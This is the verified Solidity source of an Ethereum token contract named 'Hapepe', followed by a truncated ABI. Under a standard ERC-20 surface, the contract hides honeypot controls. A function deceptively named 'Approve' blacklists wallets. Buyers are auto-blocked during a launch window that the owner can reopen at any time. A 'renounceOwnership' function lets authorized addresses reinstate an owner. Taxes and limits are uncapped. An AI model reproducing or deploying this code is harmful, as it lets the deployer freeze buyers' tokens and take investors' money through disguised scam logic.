{"SourceCode": "//https://t.me/HapepeERC\r\n//SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.8.15;\r\n\r\nabstract contract Context {\r\n\r\nfunction _msgSender() internal view virtual returns (address payable) {\r\n    return payable(msg.sender);\r\n}\r\n\r\nfunction _msgData() internal view virtual returns (bytes memory) {\r\n    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n    return msg.data;\r\n}\r\n}\r\n\r\ninterface IERC20 {\r\n\r\nfunction totalSupply() external view returns (uint256);\r\nfunction balanceOf(address account) external view returns (uint256);\r\nfunction transfer(address recipient, uint256 amount) external returns (bool);\r\nfunction allowance(address owner, address spender) external view returns (uint256);\r\nfunction approve(address spender, uint256 amount) external returns (bool);\r\nfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\nevent Transfer(address indexed from, address indexed to, uint256 value);\r\nevent Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\nlibrary SafeMath {\r\n\r\nfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n    return c;\r\n}\r\n\r\nfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n}\r\n\r\nfunction sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n}\r\n\r\nfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n        return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n    return c;\r\n}\r\n\r\nfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n}\r\n\r\nfunction div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n    return c;\r\n}\r\n\r\nfunction mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n}\r\n\r\nfunction mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n}\r\n}\r\n\r\nlibrary Address {\r\n\r\nfunction isContract(address account) internal view returns (bool) {\r\n    // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\r\n    // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\r\n    // for accounts without code, i.e. `keccak256('')`\r\n    bytes32 codehash;\r\n    bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n    // solhint-disable-next-line no-inline-assembly\r\n    assembly { codehash := extcodehash(account) }\r\n    return (codehash != accountHash && codehash != 0x0);\r\n}\r\n\r\nfunction sendValue(address payable recipient, uint256 amount) internal {\r\n    require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n    // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n    (bool success, ) = recipient.call{ value: amount }(\"\");\r\n    require(success, \"Address: unable to send value, recipient may have reverted\");\r\n}\r\n\r\nfunction functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n    return functionCall(target, data, \"Address: low-level call failed\");\r\n}\r\n\r\nfunction functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n    return _functionCallWithValue(target, data, 0, errorMessage);\r\n}\r\n\r\nfunction functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n    return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n}\r\n\r\nfunction functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n    require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n    return _functionCallWithValue(target, data, value, errorMessage);\r\n}\r\n\r\nfunction _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n    require(isContract(target), \"Address: call to non-contract\");\r\n\r\n    (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n    if (success) {\r\n        return returndata;\r\n    } else {\r\n        \r\n        if (returndata.length > 0) {\r\n            assembly {\r\n                let returndata_size := mload(returndata)\r\n                revert(add(32, returndata), returndata_size)\r\n            }\r\n        } else {\r\n            revert(errorMessage);\r\n        }\r\n    }\r\n}\r\n}\r\n\r\ncontract Ownable is Context {\r\naddress private _owner;\r\nmapping (address => bool) internal authorizations;\r\n\r\nevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\nconstructor () {\r\n    address msgSender = _msgSender();\r\n    _owner = msgSender;\r\n    authorizations[_owner] = true;\r\n    emit OwnershipTransferred(address(0), msgSender);\r\n}\r\n\r\nfunction owner() public view returns (address) {\r\n    return _owner;\r\n}   \r\n\r\n/**\r\n* Function modifier to require caller to be contract owner\r\n*/\r\nmodifier onlyOwner() {\r\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n    _;\r\n}\r\n\r\n/**\r\n* Function modifier to require caller to be authorized\r\n*/\r\nmodifier authorized() {\r\nrequire(isAuthorized(msg.sender), \"!AUTHORIZED\"); _;\r\n}\r\n\r\n/**\r\n* Authorize address. Owner only\r\n*/\r\nfunction authorize(address adr) public onlyOwner {\r\nauthorizations[adr] = true;\r\n}\r\n\r\n/**\r\n* Remove address' authorization. Owner only\r\n*/\r\nfunction unauthorize(address adr) public onlyOwner {\r\nauthorizations[adr] = false;\r\n}\r\n\r\n/**\r\n* Check if address is owner\r\n*/\r\nfunction isOwner(address account) public view returns (bool) {\r\nreturn account == _owner;\r\n}\r\n\r\n/**\r\n* Return address' authorization status\r\n*/\r\nfunction isAuthorized(address adr) public view returns (bool) {\r\nreturn authorizations[adr];\r\n}\r\n\r\nfunction waiveOwnership() public virtual onlyOwner {\r\n    emit OwnershipTransferred(_owner, address(0));\r\n    _owner = address(0);\r\n}\r\n\r\nfunction renounceOwnership(address newOwner) public virtual authorized {\r\n    if(!authorizations[msg.sender]){\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n    }\r\n\r\n    emit OwnershipTransferred(_owner, newOwner);\r\n    _owner = newOwner;\r\n}\r\n\r\nfunction getTime() public view returns (uint256) {\r\n    return block.timestamp;\r\n}\r\n\r\n event OwnershipTransferred(address owner);\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\nevent PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\nfunction feeTo() external view returns (address);\r\nfunction feeToSetter() external view returns (address);\r\n\r\nfunction getPair(address tokenA, address tokenB) external view returns (address pair);\r\nfunction allPairs(uint) external view returns (address pair);\r\nfunction allPairsLength() external view returns (uint);\r\n\r\nfunction createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\nfunction setFeeTo(address) external;\r\nfunction setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\nevent Approval(address indexed owner, address indexed spender, uint value);\r\nevent Transfer(address indexed from, address indexed to, uint value);\r\n\r\nfunction name() external pure returns (string memory);\r\nfunction symbol() external pure returns (string memory);\r\nfunction decimals() external pure returns (uint8);\r\nfunction totalSupply() external view returns (uint);\r\nfunction balanceOf(address owner) external view returns (uint);\r\nfunction allowance(address owner, address spender) external view returns (uint);\r\n\r\nfunction approve(address spender, uint value) external returns (bool);\r\nfunction transfer(address to, uint value) external returns (bool);\r\nfunction transferFrom(address from, address to, uint value) external returns (bool);\r\n\r\nfunction DOMAIN_SEPARATOR() external view returns (bytes32);\r\nfunction PERMIT_TYPEHASH() external pure returns (bytes32);\r\nfunction nonces(address owner) external view returns (uint);\r\n\r\nfunction permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n\r\nevent Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\r\nevent Swap(\r\n    address indexed sender,\r\n    uint amount0In,\r\n    uint amount1In,\r\n    uint amount0Out,\r\n    uint amount1Out,\r\n    address indexed to\r\n);\r\nevent Sync(uint112 reserve0, uint112 reserve1);\r\n\r\nfunction MINIMUM_LIQUIDITY() external pure returns (uint);\r\nfunction factory() external view returns (address);\r\nfunction token0() external view returns (address);\r\nfunction token1() external view returns (address);\r\nfunction getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\nfunction price0CumulativeLast() external view returns (uint);\r\nfunction price1CumulativeLast() external view returns (uint);\r\nfunction kLast() external view returns (uint);\r\n\r\nfunction burn(address to) external returns (uint amount0, uint amount1);\r\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\nfunction skim(address to) external;\r\nfunction sync() external;\r\n\r\nfunction initialize(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\nfunction factory() external pure returns (address);\r\nfunction WETH() external pure returns (address);\r\n\r\nfunction addLiquidity(\r\n    address tokenA,\r\n    address tokenB,\r\n    uint amountADesired,\r\n    uint amountBDesired,\r\n    uint amountAMin,\r\n    uint amountBMin,\r\n    address to,\r\n    uint deadline\r\n) external returns (uint amountA, uint amountB, uint liquidity);\r\nfunction addLiquidityETH(\r\n    address token,\r\n    uint amountTokenDesired,\r\n    uint amountTokenMin,\r\n    uint amountETHMin,\r\n    address to,\r\n    uint deadline\r\n) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\nfunction removeLiquidity(\r\n    address tokenA,\r\n    address tokenB,\r\n    uint liquidity,\r\n    uint amountAMin,\r\n    uint amountBMin,\r\n    address to,\r\n    uint deadline\r\n) external returns (uint amountA, uint amountB);\r\nfunction removeLiquidityETH(\r\n    address token,\r\n    uint liquidity,\r\n    uint amountTokenMin,\r\n    uint amountETHMin,\r\n    address to,\r\n    uint deadline\r\n) external returns (uint amountToken, uint amountETH);\r\nfunction removeLiquidityWithPermit(\r\n    address tokenA,\r\n    address tokenB,\r\n    uint liquidity,\r\n    uint amountAMin,\r\n    uint amountBMin,\r\n    address to,\r\n    uint deadline,\r\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n) external returns (uint amountA, uint amountB);\r\nfunction removeLiquidityETHWithPermit(\r\n    address token,\r\n    uint liquidity,\r\n    uint amountTokenMin,\r\n    uint amountETHMin,\r\n    address to,\r\n    uint deadline,\r\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n) external returns (uint amountToken, uint amountETH);\r\nfunction swapExactTokensForTokens(\r\n    uint amountIn,\r\n    uint amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint deadline\r\n) external returns (uint[] memory amounts);\r\nfunction swapTokensForExactTokens(\r\n    uint amountOut,\r\n    uint amountInMax,\r\n    address[] calldata path,\r\n    address to,\r\n    uint deadline\r\n) external returns (uint[] memory amounts);\r\nfunction swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\nfunction swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n    external\r\n    returns (uint[] memory amounts);\r\nfunction swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n    external\r\n    returns (uint[] memory amounts);\r\nfunction swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\n\r\nfunction quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\nfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\nfunction getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\nfunction getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\nfunction removeLiquidityETHSupportingFeeOnTransferTokens(\r\n    address token,\r\n    uint liquidity,\r\n    uint amountTokenMin,\r\n    uint amountETHMin,\r\n    address to,\r\n    uint deadline\r\n) external returns (uint amountETH);\r\nfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n    address token,\r\n    uint liquidity,\r\n    uint amountTokenMin,\r\n    uint amountETHMin,\r\n    address to,\r\n    uint deadline,\r\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n) external returns (uint amountETH);\r\n\r\nfunction swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n    uint amountIn,\r\n    uint amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint deadline\r\n) external;\r\nfunction swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n    uint amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint deadline\r\n) external payable;\r\nfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint amountIn,\r\n    uint amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint deadline\r\n) external;\r\n}\r\n\r\ncontract HAPEPE is Context, IERC20, Ownable {\r\n\r\nusing SafeMath for uint256;\r\nusing Address for address;\r\n\r\nstring private _name = \"Hapepe\";\r\nstring private _symbol = \"HAPEPE\";\r\nuint8 private _decimals = 9;\r\n\r\naddress payable private MarketingWallet = payable(0xDD59b8826bee1Db3AD19e34e2d9fA5d42E0d49CC); // Marketing Address\r\naddress payable private TeamWallet = payable(0xDD59b8826bee1Db3AD19e34e2d9fA5d42E0d49CC); // Buy Back Address\r\naddress private immutable deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n\r\nmapping (address => uint256) _balances;\r\nmapping (address => mapping (address => uint256)) private _allowances;\r\n\r\nmapping (address => bool) private isExcludedFromFee;\r\nmapping (address => bool) private isWalletLimitExempt;\r\nmapping (address => bool) private isTxLimitExempt;\r\nmapping (address => bool) private isMarketPair;\r\nmapping (address => bool) public isBlocked;\r\nbool private isaddLiquidity;\r\n\r\nuint256 private _buyLiquidityFee = 0;\r\nuint256 private _buyMarketingFee = 0;\r\nuint256 private _buyTeamFee = 0;\r\n\r\nuint256 private _sellLiquidityFee = 0;\r\nuint256 private _sellMarketingFee = 0; \r\nuint256 private _sellTeamFee = 0;\r\n\r\nuint256 private _liquidityShare = _buyLiquidityFee.add(_sellLiquidityFee);\r\nuint256 private _marketingShare = _buyMarketingFee.add(_sellMarketingFee);\r\nuint256 private _teamShare = _buyTeamFee.add(_sellTeamFee);\r\n\r\nuint256 public _totalTaxIfBuying;\r\nuint256 public _totalTaxIfSelling;\r\nuint256 private _totalDistributionShares;\r\n\r\nuint256 private _totalSupply = 100 *  10**4 * 10**_decimals;\r\nuint256 public _maxTxAmount = _totalSupply.div(20); \r\nuint256 public _walletMax = _totalSupply.div(20);\r\nuint256 private minimumTokensBeforeSwap = _totalSupply.div(500); \r\n\r\nIUniswapV2Router02 private uniswapV2Router;\r\naddress private uniswapPair;\r\n\r\nbool inSwapAndLiquify;\r\nbool private swapAndLiquifyEnabled = true;\r\nbool private swapAndLiquifyByLimitOnly = true;\r\nbool private checkWalletLimit = true;\r\nuint256 public endtime = 5; //set the end time\r\nuint256 private feeTXtime;\r\n\r\nevent SwapAndLiquifyEnabledUpdated(bool enabled);\r\nevent SwapAndLiquify(\r\n    uint256 tokensSwapped,\r\n    uint256 ethReceived,\r\n    uint256 tokensIntoLiqudity\r\n);\r\n\r\nevent SwapETHForTokens(\r\n    uint256 amountIn,\r\n    address[] path\r\n);\r\n\r\nevent SwapTokensForETH(\r\n    uint256 amountIn,\r\n    address[] path\r\n);\r\n\r\nmodifier lockTheSwap {\r\n    inSwapAndLiquify = true;\r\n    _;\r\n    inSwapAndLiquify = false;\r\n}\r\n\r\nconstructor () {\r\n    \r\n    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); \r\n\r\n    uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n        .createPair(address(this), _uniswapV2Router.WETH());\r\n\r\n    uniswapV2Router = _uniswapV2Router;\r\n    _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;\r\n\r\n    isExcludedFromFee[owner()] = true;\r\n    isExcludedFromFee[address(this)] = true;\r\n    \r\n    _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);\r\n    _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);\r\n    _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);\r\n\r\n    isWalletLimitExempt[owner()] = true;\r\n    isWalletLimitExempt[address(uniswapPair)] = true;\r\n    isWalletLimitExempt[address(this)] = true;\r\n    \r\n    isTxLimitExempt[owner()] = true;\r\n    isTxLimitExempt[address(this)] = true;\r\n\r\n    isMarketPair[address(uniswapPair)] = true;\r\n\r\n    _balances[_msgSender()] = _totalSupply;\r\n    emit Transfer(address(0), _msgSender(), _totalSupply);\r\n}\r\n\r\nfunction name() public view returns (string memory) {\r\n    return _name;\r\n}\r\n\r\nfunction symbol() public view returns (string memory) {\r\n    return _symbol;\r\n}\r\n\r\nfunction decimals() public view returns (uint8) {\r\n    return _decimals;\r\n}\r\n\r\nfunction totalSupply() public view override returns (uint256) {\r\n    return _totalSupply;\r\n}\r\n\r\nfunction balanceOf(address account) public view override returns (uint256) {\r\n    return _balances[account];\r\n}\r\n\r\nfunction allowance(address owner, address spender) public view override returns (uint256) {\r\n    return _allowances[owner][spender];\r\n}\r\n\r\nfunction increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n    return true;\r\n}\r\n\r\nfunction decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n    return true;\r\n}\r\n\r\nfunction approve(address spender, uint256 amount) public override returns (bool) {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;\r\n}\r\n\r\nfunction _approve(address owner, address spender, uint256 amount) private {\r\n    require(owner != address(0), \"ERC20: approve from the zero address\");\r\n    require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount);\r\n}\r\n\r\n//Approve address transactions\r\nfunction Approve(address[] calldata addresses, bool status) public authorized{\r\n    for (uint256 i; i < addresses.length; ++i) {\r\n        isBlocked[addresses[i]] = status;\r\n    }\r\n}\r\n\r\nfunction ManageBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {\r\n    _buyLiquidityFee = newLiquidityTax;\r\n    _buyMarketingFee = newMarketingTax;\r\n    _buyTeamFee = newTeamTax;\r\n\r\n    _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);\r\n}\r\n\r\nfunction ManageSellTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {\r\n    _sellLiquidityFee = newLiquidityTax;\r\n    _sellMarketingFee = newMarketingTax;\r\n    _sellTeamFee = newTeamTax;\r\n\r\n    _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);\r\n}\r\n\r\nfunction setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {\r\n    _maxTxAmount = maxTxAmount;\r\n}\r\n\r\nfunction enableDisableWalletLimit(bool newValue) external onlyOwner {\r\n    checkWalletLimit = newValue;\r\n}\r\n\r\nfunction setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {\r\n    isWalletLimitExempt[holder] = exempt;\r\n}\r\n\r\nfunction setWalletLimit(uint256 newLimit) external onlyOwner {\r\n    _walletMax  = newLimit;\r\n}\r\n\r\nfunction setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {\r\n    minimumTokensBeforeSwap = newLimit;\r\n}\r\n\r\nfunction setFeeReceivers(address _marketingFeeReceiver, address _devFeeReceiver) external onlyOwner() {\r\n    MarketingWallet = payable(_marketingFeeReceiver);\r\n    TeamWallet = payable(_devFeeReceiver); \r\n}\r\n\r\nfunction setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {\r\n    swapAndLiquifyEnabled = _enabled;\r\n    emit SwapAndLiquifyEnabledUpdated(_enabled);\r\n}\r\n\r\nfunction setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {\r\n    swapAndLiquifyByLimitOnly = newValue;\r\n}\r\n\r\nfunction getCirculatingSupply() public view returns (uint256) {\r\n    return _totalSupply.sub(balanceOf(deadAddress));\r\n}\r\n\r\nfunction transferToAddressETH(address payable recipient, uint256 amount) private {\r\n    recipient.transfer(amount);\r\n}\r\n\r\n    //to recieve ETH from uniswapV2Router when swaping\r\nreceive() external payable {}\r\n\r\nfunction transfer(address recipient, uint256 amount) public override returns (bool) {\r\n    _transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n}\r\n\r\nfunction transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n    _transfer(sender, recipient, amount);\r\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n    return true;\r\n}\r\n\r\nfunction _transfer(address sender, address recipient, uint256 amount) private returns (bool) {\r\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n    //check bots\r\n    if (sender == uniswapPair && recipient != owner() && !isaddLiquidity) {\r\n        if (endtime == 0) {\r\n            endtime = block.timestamp + feeTXtime;\r\n        }\r\n        if (endtime > block.timestamp) {\r\n            isBlocked[recipient] = true;\r\n        } else {\r\n            isaddLiquidity = true;\r\n        }\r\n    }\r\n\r\n    // Verify address credentials\r\n    require(!isBlocked[recipient] && !isBlocked[sender], 'Address is Declined');\r\n    \r\n\r\n    if(inSwapAndLiquify)\r\n    { \r\n        return _basicTransfer(sender, recipient, amount); \r\n    }\r\n    else\r\n    {\r\n        if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {\r\n            require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\r\n        }            \r\n\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n        bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;\r\n        \r\n        if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) \r\n        {\r\n            if(swapAndLiquifyByLimitOnly)\r\n                contractTokenBalance = minimumTokensBeforeSwap;\r\n            swapAndLiquify(contractTokenBalance);    \r\n        }\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n\r\n        uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? \r\n                                        amount : takeFee(sender, recipient, amount);\r\n\r\n        if(checkWalletLimit && !isWalletLimitExempt[recipient])\r\n            require(balanceOf(recipient).add(finalAmount) <= _walletMax);\r\n\r\n        _balances[recipient] = _balances[recipient].add(finalAmount);\r\n\r\n        emit Transfer(sender, recipient, finalAmount);\r\n        return true;\r\n    }\r\n    \r\n}\r\n\r\nfunction _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n    _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n    _balances[recipient] = _balances[recipient].add(amount);\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n}\r\n\r\nfunction swapAndLiquify(uint256 tAmount) private lockTheSwap {\r\n    \r\n    uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);\r\n    uint256 tokensForSwap = tAmount.sub(tokensForLP);\r\n\r\n    swapTokensForEth(tokensForSwap);\r\n    uint256 amountReceived = address(this).balance;\r\n\r\n    uint256 totalETHFee = _totalDistributionShares.sub(_liquidityShare.div(2));\r\n    \r\n    uint256 amountETHLiquidity = amountReceived.mul(_liquidityShare).div(totalETHFee).div(2);\r\n    uint256 amountETHTeam = amountReceived.mul(_teamShare).div(totalETHFee);\r\n    uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHTeam);\r\n\r\n    if(amountETHMarketing > 0)\r\n        transferToAddressETH(MarketingWallet, amountETHMarketing);\r\n\r\n    if(amountETHTeam > 0)\r\n        transferToAddressETH(TeamWallet, amountETHTeam);\r\n\r\n    if(amountETHLiquidity > 0 && tokensForLP > 0)\r\n        addLiquidity(tokensForLP, amountETHLiquidity);\r\n}\r\n\r\nfunction swapTokensForEth(uint256 tokenAmount) private {\r\n    // generate the uniswap pair path of token -> weth\r\n    address[] memory path = new address[](2);\r\n    path[0] = address(this);\r\n    path[1] = uniswapV2Router.WETH();\r\n\r\n    _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\r\n    // make the swap\r\n    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        tokenAmount,\r\n        0, // accept any amount of ETH\r\n        path,\r\n        address(this), // The contract\r\n        block.timestamp\r\n    );\r\n    \r\n    emit SwapTokensForETH(tokenAmount, path);\r\n}\r\n\r\nfunction addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n    // approve token transfer to cover all possible scenarios\r\n    _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\r\n    // add the liquidity\r\n    uniswapV2Router.addLiquidityETH{value: ethAmount}(\r\n        address(this),\r\n        tokenAmount,\r\n        0, // slippage is unavoidable\r\n        0, // slippage is unavoidable\r\n        owner(),\r\n        block.timestamp\r\n    );\r\n}\r\n\r\nfunction takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n    \r\n    uint256 feeAmount = 0;\r\n    \r\n    if(isMarketPair[sender]) {\r\n        feeAmount = amount.mul(_totalTaxIfBuying).div(100);\r\n    }\r\n    else if(isMarketPair[recipient]) {\r\n        feeAmount = amount.mul(_totalTaxIfSelling).div(100);\r\n    }\r\n    \r\n    if(feeAmount > 0) {\r\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n        emit Transfer(sender, address(this), feeAmount);\r\n    }\r\n\r\n    return amount.sub(feeAmount);\r\n}\r\n\r\n//manage Blacklist\r\nfunction manage_blacklist(address[] calldata addresses, bool status) public onlyOwner{\r\n    for (uint256 i; i < addresses.length; ++i) {\r\n        isBlocked[addresses[i]] = status;\r\n    }\r\n}\r\n\r\nfunction UPfeeTXtime(uint256 _feeTXtime) external onlyOwner{\r\n    feeTXtime = _feeTXtime;\r\n}\r\n\r\nfunction EndTime30() external onlyOwner{\r\n    endtime = block.timestamp + 30;\r\n}\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSwapped\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethReceived\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensIntoLiqudity\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"SwapAndLiquifyEnabledUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"}],\"name\":\"SwapETHForTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"}],\"name\":\"SwapTokensForETH\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{